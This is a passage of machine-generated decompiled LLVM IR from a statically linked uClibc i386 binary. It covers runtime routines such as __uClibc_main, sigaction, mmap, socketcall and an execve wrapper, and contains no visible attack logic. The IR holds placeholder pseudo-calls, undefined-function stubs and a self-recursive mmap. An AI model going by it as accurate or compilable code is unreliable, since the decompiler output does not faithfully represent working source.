  %v1_8051b4a = load i32, i32* @esi, align 4
  %v12_8051b4a = icmp eq i32 %v5_8051b42, %v1_8051b4a
  br i1 %v12_8051b4a, label %dec_label_pc_8051b53, label %dec_label_pc_8051b4e

dec_label_pc_8051b4e:                             ; preds = %dec_label_pc_8051b3a
  %v0_8051b4e = call i32 @abort()
  br label %dec_label_pc_8051b53

dec_label_pc_8051b53:                             ; preds = %dec_label_pc_8051b3a, %entry, %dec_label_pc_8051b4e
  %v2_8051b53 = load i32, i32* %stack_var_-12, align 4
  %v2_8051b54 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051b54, i32* @ebx, align 4
  store i32 %v0_8051b23, i32* @esi, align 4
  ret i32 %v2_8051b53

; uselistorder directives
  uselistorder i32 ()* @abort, { 0, 3, 2, 4, 1 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 0, 1, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder label %dec_label_pc_8051b53, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_8051b5a = load i8, i8* @global_var_80602dc.226, align 4
  %v1_8051b5a = icmp eq i8 %v0_8051b5a, 0
  %v1_8051b61 = icmp eq i1 %v1_8051b5a, false
  br i1 %v1_8051b61, label %entry.dec_label_pc_8051b93_crit_edge, label %dec_label_pc_8051b63

entry.dec_label_pc_8051b93_crit_edge:             ; preds = %entry
  %v0_8051b96.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051b93

dec_label_pc_8051b63:                             ; preds = %entry
  store i8 1, i8* @global_var_80602dc.226, align 4
  store i32 4096, i32* @global_var_80602d0.151, align 16
  %v0_8051b8e = call i32 @_stdio_init()
  br label %dec_label_pc_8051b93

dec_label_pc_8051b93:                             ; preds = %entry.dec_label_pc_8051b93_crit_edge, %dec_label_pc_8051b63
  %v0_8051b96 = phi i32 [ %v0_8051b96.pre, %entry.dec_label_pc_8051b93_crit_edge ], [ %v0_8051b8e, %dec_label_pc_8051b63 ]
  ret i32 %v0_8051b96

; uselistorder directives
  uselistorder i8* @global_var_80602dc.226, { 1, 0 }
  uselistorder label %dec_label_pc_8051b93, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp22 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %v0_8051b97 = load i32, i32* @ebp, align 4
  store i32 %tmp29, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_80602c8.227, align 8
  store i32 %arg6, i32* @global_var_80602d8.224, align 8
  %v2_8051bce = mul i32 %arg2, 4
  %v3_8051bce = add i32 %tmp29, %v2_8051bce
  %v1_8051bd1 = add i32 %v3_8051bce, 4
  store i32 %v1_8051bd1, i32* %edx.global-to-local, align 4
  store i32 %v1_8051bd1, i32* @global_var_80602cc.219, align 4
  %v3_8051bda = load i32, i32* %arg3, align 4
  %v14_8051bda = icmp eq i32 %v1_8051bd1, %v3_8051bda
  store i32 0, i32* %stack_var_-168, align 4
  %v1_8051be0 = icmp eq i1 %v14_8051bda, false
  %v4_8051be0 = select i1 %v1_8051be0, i32 %v1_8051bd1, i32 %v3_8051bce
  store i32 %v4_8051be0, i32* @global_var_80602cc.219, align 4
  %v2_8051be8 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8051bed = bitcast i32* %stack_var_-136 to i8*
  %v4_8051bed = call i32 @__GI_memset(i8* %v3_8051bed, i32 0, i32 120)
  %v0_8051bf2 = load i32, i32* @global_var_80602cc.219, align 4
  br label %dec_label_pc_8051bfa

dec_label_pc_8051bfa:                             ; preds = %dec_label_pc_8051bfa, %entry
  %v0_8051bfa = phi i32 [ %v1_8051bfd, %dec_label_pc_8051bfa ], [ %v0_8051bf2, %entry ]
  %v1_8051bfa = inttoptr i32 %v0_8051bfa to i32*
  %v2_8051bfa = load i32, i32* %v1_8051bfa, align 4
  %v3_8051bfa = icmp eq i32 %v2_8051bfa, 0
  %v1_8051bfd = add i32 %v0_8051bfa, 4
  %v1_8051c00 = icmp eq i1 %v3_8051bfa, false
  br i1 %v1_8051c00, label %dec_label_pc_8051bfa, label %dec_label_pc_8051c21.preheader

dec_label_pc_8051c21.preheader:                   ; preds = %dec_label_pc_8051bfa
  store i32 %v1_8051bfd, i32* @ebx, align 4
  %v1_8051c211 = inttoptr i32 %v1_8051bfd to i32*
  %v2_8051c212 = load i32, i32* %v1_8051c211, align 4
  %v3_8051c213 = icmp eq i32 %v2_8051c212, 0
  %v1_8051c2410 = icmp eq i1 %v3_8051c213, false
  br i1 %v1_8051c2410, label %dec_label_pc_8051c06.lr.ph, label %dec_label_pc_8051c26

dec_label_pc_8051c06.lr.ph:                       ; preds = %dec_label_pc_8051c21.preheader
  %v3_8051bde = ptrtoint i32* %stack_var_-168 to i32
  %v3_8051c11 = add i32 %v3_8051bde, 32
  br label %dec_label_pc_8051c06

dec_label_pc_8051c06:                             ; preds = %dec_label_pc_8051c06.lr.ph, %dec_label_pc_8051c1e
  %v1_8051c11 = phi i32 [ %v2_8051c212, %dec_label_pc_8051c06.lr.ph ], [ %v2_8051c21, %dec_label_pc_8051c1e ]
  %v0_8051c10 = phi i32 [ %v1_8051bfd, %dec_label_pc_8051c06.lr.ph ], [ %v1_8051c1e, %dec_label_pc_8051c1e ]
  %v6_8051c0b = icmp ugt i32 %v1_8051c11, 14
  br i1 %v6_8051c0b, label %dec_label_pc_8051c1e, label %dec_label_pc_8051c0d

dec_label_pc_8051c0d:                             ; preds = %dec_label_pc_8051c06
  %v0_8051c0d = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8051c0d, i32* %stack_var_-160, align 4
  store i32 %v0_8051c10, i32* %stack_var_-168, align 4
  %v2_8051c11 = mul i32 %v1_8051c11, 8
  %v4_8051c11 = add i32 %v3_8051c11, %v2_8051c11
  %v3_8051c16 = inttoptr i32 %v4_8051c11 to i16*
  %v4_8051c16 = call i32 @memcpy(i16* %v3_8051c16, i32 %v0_8051c10, i32 8)
  %v0_8051c1e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051c1e

dec_label_pc_8051c1e:                             ; preds = %dec_label_pc_8051c06, %dec_label_pc_8051c0d
  %v0_8051c1e = phi i32 [ %v0_8051c10, %dec_label_pc_8051c06 ], [ %v0_8051c1e.pre, %dec_label_pc_8051c0d ]
  %v1_8051c1e = add i32 %v0_8051c1e, 8
  store i32 %v1_8051c1e, i32* @ebx, align 4
  %v1_8051c21 = inttoptr i32 %v1_8051c1e to i32*
  %v2_8051c21 = load i32, i32* %v1_8051c21, align 4
  %v3_8051c21 = icmp eq i32 %v2_8051c21, 0
  %v1_8051c24 = icmp eq i1 %v3_8051c21, false
  br i1 %v1_8051c24, label %dec_label_pc_8051c06, label %dec_label_pc_8051c26

dec_label_pc_8051c26:                             ; preds = %dec_label_pc_8051c1e, %dec_label_pc_8051c21.preheader
  store i32 %v2_8051be8, i32* @eax, align 4
  %v0_8051c2a = call i32 @_dl_aux_init()
  store i32 %v0_8051c2a, i32* @eax, align 4
  %v0_8051c2f = call i32 @__GI___uClibc_init()
  store i32 4096, i32* %edx.global-to-local, align 4
  %v1_8051c3d = icmp eq i32 %tmp24, 0
  %v3_8051c3f = select i1 %v1_8051c3d, i32 4096, i32 %tmp24
  %v13_8051c42 = icmp eq i32 %tmp23, -1
  store i32 %v3_8051c3f, i32* @global_var_80602d0.151, align 16
  %v1_8051c4c = icmp eq i1 %v13_8051c42, false
  br i1 %v1_8051c4c, label %dec_label_pc_8051c77, label %dec_label_pc_8051c4e

dec_label_pc_8051c4e:                             ; preds = %dec_label_pc_8051c26
  %v0_8051c4e = call i32 @getuid()
  store i32 %v0_8051c4e, i32* @ebx, align 4
  %v0_8051c55 = call i32 @geteuid()
  %v0_8051c5a = load i32, i32* @ebx, align 4
  %v12_8051c5a = icmp eq i32 %v0_8051c5a, %v0_8051c55
  %v1_8051c5c = icmp eq i1 %v12_8051c5a, false
  br i1 %v1_8051c5c, label %dec_label_pc_8051c8d, label %dec_label_pc_8051c5e

dec_label_pc_8051c5e:                             ; preds = %dec_label_pc_8051c4e
  %v0_8051c5e = call i32 @getgid()
  store i32 %v0_8051c5e, i32* @ebx, align 4
  %v0_8051c65 = call i32 @getegid()
  %v0_8051c6a = load i32, i32* @ebx, align 4
  %v12_8051c6a = icmp eq i32 %v0_8051c6a, %v0_8051c65
  %v1_8051c6c = icmp eq i1 %v12_8051c6a, false
  br i1 %v1_8051c6c, label %dec_label_pc_8051c8d, label %dec_label_pc_8051c6e.thread

dec_label_pc_8051c6e.thread:                      ; preds = %dec_label_pc_8051c5e
  br label %dec_label_pc_8051cb7

dec_label_pc_8051c77:                             ; preds = %dec_label_pc_8051c26
  %v15_8051c77 = icmp eq i32 %tmp23, %tmp22
  %v1_8051c7b = icmp eq i1 %v15_8051c77, false
  br i1 %v1_8051c7b, label %dec_label_pc_8051c8d, label %dec_label_pc_8051c7d

dec_label_pc_8051c7d:                             ; preds = %dec_label_pc_8051c77
  br label %dec_label_pc_8051c8d

dec_label_pc_8051c8d:                             ; preds = %dec_label_pc_8051c7d, %dec_label_pc_8051c77, %dec_label_pc_8051c5e, %dec_label_pc_8051c4e
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8051c94 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8051ca3 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8051cb2 = call i32 @__check_one_fd()
  br label %dec_label_pc_8051cb7

dec_label_pc_8051cb7:                             ; preds = %dec_label_pc_8051c6e.thread, %dec_label_pc_8051c8d
  %v0_8051cb7 = load i32, i32* @edi, align 4
  %v1_8051cb7 = inttoptr i32 %v0_8051cb7 to i32*
  %v2_8051cb7 = load i32, i32* %v1_8051cb7, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80596a8.221 to i32), i32 -134583976), i32 2), i32* %esi.global-to-local, align 4
  store i32 %v2_8051cb7, i32* inttoptr (i32 134586424 to i32*), align 8
  store i32 %arg5, i32* @global_var_80602d4.223, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80596a8.221 to i32), i32 -134583976), i32 2), i32 0), label %dec_label_pc_8051cdc, label %dec_label_pc_8051ce8

dec_label_pc_8051cdc:                             ; preds = %dec_label_pc_8051cb7, %dec_label_pc_8051cdc
  %v4_8051cdc53 = phi i32 [ %v1_8051ce3, %dec_label_pc_8051cdc ], [ 0, %dec_label_pc_8051cb7 ]
  %v5_8051cdc = mul i32 %v4_8051cdc53, 4
  %v6_8051cdc = add i32 %v5_8051cdc, ptrtoint (i32* @global_var_80596a8.221 to i32)
  %v7_8051cdc = inttoptr i32 %v6_8051cdc to i32*
  %v8_8051cdc = load i32, i32* %v7_8051cdc, align 4
  call void @__pseudo_call(i32 %v8_8051cdc)
  %v0_8051ce3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051ce3 = add i32 %v0_8051ce3, 1
  store i32 %v1_8051ce3, i32* %ebx.global-to-local, align 4
  %v1_8051ce4 = load i32, i32* %esi.global-to-local, align 4
  %v7_8051ce4 = icmp ult i32 %v1_8051ce3, %v1_8051ce4
  br i1 %v7_8051ce4, label %dec_label_pc_8051cdc, label %dec_label_pc_8051ce8

dec_label_pc_8051ce8:                             ; preds = %dec_label_pc_8051cdc, %dec_label_pc_8051cb7
  store i32 134552814, i32* %stack_var_-160, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80596a8.221 to i32), i32 -134583976), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80596a8.221 to i32), i32 -134583976), i32 2), i32 0), label %dec_label_pc_8051d00, label %dec_label_pc_8051d0c

dec_label_pc_8051d00:                             ; preds = %dec_label_pc_8051ce8, %dec_label_pc_8051d00
  %v4_8051d0043 = phi i32 [ %v1_8051d07, %dec_label_pc_8051d00 ], [ 0, %dec_label_pc_8051ce8 ]
  store i32 ptrtoint (i32* @global_var_8051d07.230 to i32), i32* %stack_var_-160, align 4
  %v5_8051d00 = mul i32 %v4_8051d0043, 4
  %v6_8051d00 = add i32 %v5_8051d00, ptrtoint (i32* @global_var_80596a8.221 to i32)
  %v7_8051d00 = inttoptr i32 %v6_8051d00 to i32*
  %v8_8051d00 = load i32, i32* %v7_8051d00, align 4
  call void @__pseudo_call(i32 %v8_8051d00)
  %v0_8051d07 = load i32, i32* @ebx, align 4
  %v1_8051d07 = add i32 %v0_8051d07, 1
  store i32 %v1_8051d07, i32* @ebx, align 4
  %v1_8051d08.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8051d08 = icmp ult i32 %v1_8051d07, %v1_8051d08.pre
  br i1 %v7_8051d08, label %dec_label_pc_8051d00, label %dec_label_pc_8051d0c

dec_label_pc_8051d0c:                             ; preds = %dec_label_pc_8051d00, %dec_label_pc_8051ce8
  %v0_8051d15 = load i32, i32* %stack_var_-160, align 4
  %v1_8051d15 = call i32 @__errno_location(i32 %v0_8051d15)
  %v1_8051d1a = inttoptr i32 %v1_8051d15 to i32*
  store i32 0, i32* %v1_8051d1a, align 4
  %v0_8051d29 = call i32 @__GI___h_errno_location()
  store i32 %v0_8051d29, i32* @eax, align 4
  %v1_8051d2e = inttoptr i32 %v0_8051d29 to i32*
  store i32 0, i32* %v1_8051d2e, align 4
  %v0_8051d35 = load i32, i32* @global_var_80602cc.219, align 4
  store i32 %v0_8051d35, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %v0_8051b97)
  %v0_8051d4a = load i32, i32* @eax, align 4
  %v1_8051d4d = call i32 @__GI_exit(i32 %v0_8051d4a)
  %v0_8051d59 = load i32, i32* @ebx, align 4
  %v1_8051d59 = inttoptr i32 %v0_8051d59 to %sigcontext*
  %v2_8051d59 = call i32 @sigreturn(%sigcontext* %v1_8051d59)
  %v0_8051d61 = load i32, i32* @ebx, align 4
  %v1_8051d61 = inttoptr i32 %v0_8051d61 to %sigcontext*
  %v2_8051d61 = call i32 @sigreturn(%sigcontext* %v1_8051d61)
  ret i32 %v2_8051d61

; uselistorder directives
  uselistorder i32 %v1_8051d07, { 1, 2, 0 }
  uselistorder i32 %v1_8051ce3, { 1, 2, 0 }
  uselistorder i32 %v2_8051c21, { 1, 0 }
  uselistorder i32 %v1_8051c1e, { 2, 1, 0 }
  uselistorder i32 %v1_8051bfd, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8051bfa, { 1, 0 }
  uselistorder i32 %v1_8051bd1, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 6, 5, 3, 4, 2, 1 }
  uselistorder i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80596a8.221 to i32), i32 -134583976), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80596a8.221 to i32), i32 -134583976), i32 2), { 2, 0, 3, 4, 1 }
  uselistorder i32 ()* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 14, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_8051d00, { 1, 0 }
  uselistorder label %dec_label_pc_8051cdc, { 1, 0 }
  uselistorder label %dec_label_pc_8051cb7, { 1, 0 }
  uselistorder label %dec_label_pc_8051c1e, { 1, 0 }
  uselistorder label %dec_label_pc_8051c06, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_8051d63 = load i32, i32* @esi, align 4
  %v0_8051d64 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8051d79 = icmp eq i32* %arg2, null
  br i1 %v1_8051d79, label %dec_label_pc_8051dcd, label %dec_label_pc_8051d7d

dec_label_pc_8051d7d:                             ; preds = %entry
  %v2_8051d7d = load i32, i32* %arg2, align 4
  store i32 %v2_8051d7d, i32* %stack_var_-148, align 4
  %v1_8051d86 = add i32 %tmp11, 4
  %v3_8051d98 = bitcast i32* %stack_var_-136 to i16*
  %v4_8051d98 = call i32 @memcpy(i16* %v3_8051d98, i32 %v1_8051d86, i32 128)
  br label %dec_label_pc_8051dcd

dec_label_pc_8051dcd:                             ; preds = %entry, %dec_label_pc_8051d7d
  %v1_8051dcf = icmp eq i32 %arg3, 0
  br i1 %v1_8051dcf, label %dec_label_pc_8051dd7, label %dec_label_pc_8051dd3

dec_label_pc_8051dd3:                             ; preds = %dec_label_pc_8051dcd
  %v2_8051dd3 = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_8051dd7

dec_label_pc_8051dd7:                             ; preds = %dec_label_pc_8051dcd, %dec_label_pc_8051dd3
  %v0_8051de6 = phi i32 [ 0, %dec_label_pc_8051dcd ], [ %v2_8051dd3, %dec_label_pc_8051dd3 ]
  br i1 %v1_8051d79, label %dec_label_pc_8051de4, label %dec_label_pc_8051ddd

dec_label_pc_8051ddd:                             ; preds = %dec_label_pc_8051dd7
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_8051de4

dec_label_pc_8051de4:                             ; preds = %dec_label_pc_8051dd7, %dec_label_pc_8051ddd
  %v0_8051de7 = phi %sigaction* [ null, %dec_label_pc_8051dd7 ], [ %phitmp, %dec_label_pc_8051ddd ]
  %v5_8051def = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_8051de7, i32 %v0_8051de6, i32 8)
  store i32 %v5_8051def, i32* %ebx.global-to-local, align 4
  br i1 %v1_8051dcf, label %dec_label_pc_8051e32, label %dec_label_pc_8051dfd

dec_label_pc_8051dfd:                             ; preds = %dec_label_pc_8051de4
  %v2_8051dfd = icmp slt i32 %v5_8051def, 0
  br i1 %v2_8051dfd, label %dec_label_pc_8051e32, label %dec_label_pc_8051e01

dec_label_pc_8051e01:                             ; preds = %dec_label_pc_8051dfd
  %v3_8051e01 = load i32, i32* %stack_var_-288, align 4
  %v2_8051e05 = inttoptr i32 %arg3 to i32*
  store i32 %v3_8051e01, i32* %v2_8051e05, align 4
  %v2_8051e0d = ptrtoint i32* %stack_var_-276 to i32
  %v1_8051e12 = add i32 %arg3, 4
  %v3_8051e16 = inttoptr i32 %v1_8051e12 to i16*
  %v4_8051e16 = call i32 @memcpy(i16* %v3_8051e16, i32 %v2_8051e0d, i32 128)
  %v2_8051e1f = add i32 %arg3, 132
  %v3_8051e1f = inttoptr i32 %v2_8051e1f to i32*
  %v2_8051e2c = add i32 %arg3, 136
  %v3_8051e2c = inttoptr i32 %v2_8051e2c to i32*
  %v0_8051e38.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051e32

dec_label_pc_8051e32:                             ; preds = %dec_label_pc_8051dfd, %dec_label_pc_8051de4, %dec_label_pc_8051e01
  %v0_8051e38 = phi i32 [ %v5_8051def, %dec_label_pc_8051dfd ], [ %v5_8051def, %dec_label_pc_8051de4 ], [ %v0_8051e38.pre, %dec_label_pc_8051e01 ]
  store i32 %v0_8051d64, i32* @ebx, align 4
  store i32 %v0_8051d63, i32* @esi, align 4
  ret i32 %v0_8051e38

; uselistorder directives
  uselistorder i1 %v1_8051dcf, { 1, 0 }
  uselistorder i1 %v1_8051d79, { 1, 0 }
  uselistorder i32* null, { 0, 4, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 2, 3 }
  uselistorder i32 %arg3, { 2, 0, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_8051e32, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051de4, { 1, 0 }
  uselistorder label %dec_label_pc_8051dd7, { 1, 0 }
  uselistorder label %dec_label_pc_8051dcd, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_8051e43 = load i32, i32* @eax, align 4
  %v1_8051e45 = sub i32 0, %v0_8051e43
  %v1_8051e47 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v2_8051e4c = inttoptr i32 %v1_8051e47 to i32*
  store i32 %v1_8051e45, i32* %v2_8051e4c, align 4
  ret i32 -1
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_8051e58 = load i32, i32* @ebx, align 4
  %v2_8051e5f = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_8051e5f, i32* @ebx, align 4
  %v8_8051e63 = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_8051e58, i32* @ebx, align 4
  %tmp = icmp ugt i32 %v8_8051e63, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 134553152)
  ret i32 %v8_8051e63

; uselistorder directives
  uselistorder i32 %v8_8051e63, { 1, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 1, 0 }
  uselistorder i32 134553152, { 1, 0 }
  uselistorder i32 -4096, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051e74 = load i32, i32* @ebx, align 4
  store i32 %v0_8051e74, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8051e87 = call i32 @int80_syscall(i32 102)
  store i32 %v1_8051e87, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051e87, -4095
  br i1 %tmp, label %dec_label_pc_8051ea0, label %dec_label_pc_8051e94

dec_label_pc_8051e94:                             ; preds = %entry
  %v0_8051e94 = load i32, i32* %stack_var_-4, align 4
  %v1_8051e94 = call i32 @__errno_location(i32 %v0_8051e94)
  %v0_8051e99 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051e99 = sub i32 0, %v0_8051e99
  %v2_8051e9b = inttoptr i32 %v1_8051e94 to i32*
  store i32 %v1_8051e99, i32* %v2_8051e9b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051ea0

dec_label_pc_8051ea0:                             ; preds = %entry, %dec_label_pc_8051e94
  %v0_8051ea1 = phi i32 [ %v1_8051e87, %entry ], [ -1, %dec_label_pc_8051e94 ]
  %v2_8051ea0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051ea0, i32* @edx, align 4
  %v2_8051ea4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051ea4, i32* @ebx, align 4
  ret i32 %v0_8051ea1

; uselistorder directives
  uselistorder i32 %v1_8051e87, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051ea0, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_8051ea9 = load i32, i32* @esi, align 4
  store i32 %v0_8051ea9, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8051ebd = load i32, i32* @ebx, align 4
  %v7_8051ec5 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_8051ec5, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v7_8051ec5, -4095
  br i1 %tmp, label %dec_label_pc_8051edd, label %dec_label_pc_8051ed1

dec_label_pc_8051ed1:                             ; preds = %entry
  %v1_8051ed1 = call i32 @__errno_location(i32 %v0_8051ebd)
  %v0_8051ed6 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051ed6 = sub i32 0, %v0_8051ed6
  %v2_8051ed8 = inttoptr i32 %v1_8051ed1 to i32*
  store i32 %v1_8051ed6, i32* %v2_8051ed8, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051edd

dec_label_pc_8051edd:                             ; preds = %entry, %dec_label_pc_8051ed1
  %v0_8051ede = phi i32 [ %v7_8051ec5, %entry ], [ -1, %dec_label_pc_8051ed1 ]
  %v2_8051ee0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051ee0, i32* @esi, align 4
  ret i32 %v0_8051ede

; uselistorder directives
  uselistorder i32 %v7_8051ec5, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051edd, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051ee4 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ee4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_8051ef7 = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_8051ef7, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8051ef7, -4095
  br i1 %tmp, label %dec_label_pc_8051f10, label %dec_label_pc_8051f04

dec_label_pc_8051f04:                             ; preds = %entry
  %v0_8051f04 = load i32, i32* %stack_var_-4, align 4
  %v1_8051f04 = call i32 @__errno_location(i32 %v0_8051f04)
  %v0_8051f09 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051f09 = sub i32 0, %v0_8051f09
  %v2_8051f0b = inttoptr i32 %v1_8051f04 to i32*
  store i32 %v1_8051f09, i32* %v2_8051f0b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051f10

dec_label_pc_8051f10:                             ; preds = %entry, %dec_label_pc_8051f04
  %v0_8051f11 = phi i32 [ %v4_8051ef7, %entry ], [ -1, %dec_label_pc_8051f04 ]
  %v2_8051f10 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051f10, i32* @edx, align 4
  %v2_8051f14 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051f14, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051f11

; uselistorder directives
  uselistorder i32 %v4_8051ef7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051f10, { 1, 0 }
}

define i32 @__GI_execve(i8* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_8051f18 = load i32, i32* @edi, align 4
  store i32 %v0_8051f18, i32* %stack_var_-4, align 4
  %v4_8051f1c = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051f1c, i32* %edi.global-to-local, align 4
  %v0_8051f28 = load i32, i32* @ebx, align 4
  %v5_8051f30 = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_8051f30 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_8051f30 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_8051f30, [1 x i8*] %v8_8051f30)
  store i32 %v9_8051f30, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_8051f30, -4095
  br i1 %tmp12, label %dec_label_pc_8051f48, label %dec_label_pc_8051f3c

dec_label_pc_8051f3c:                             ; preds = %entry
  %v1_8051f3c = call i32 @__errno_location(i32 %v0_8051f28)
  %v0_8051f41 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051f41 = sub i32 0, %v0_8051f41
  %v2_8051f43 = inttoptr i32 %v1_8051f3c to i32*
  store i32 %v1_8051f41, i32* %v2_8051f43, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051f48

dec_label_pc_8051f48:                             ; preds = %entry, %dec_label_pc_8051f3c
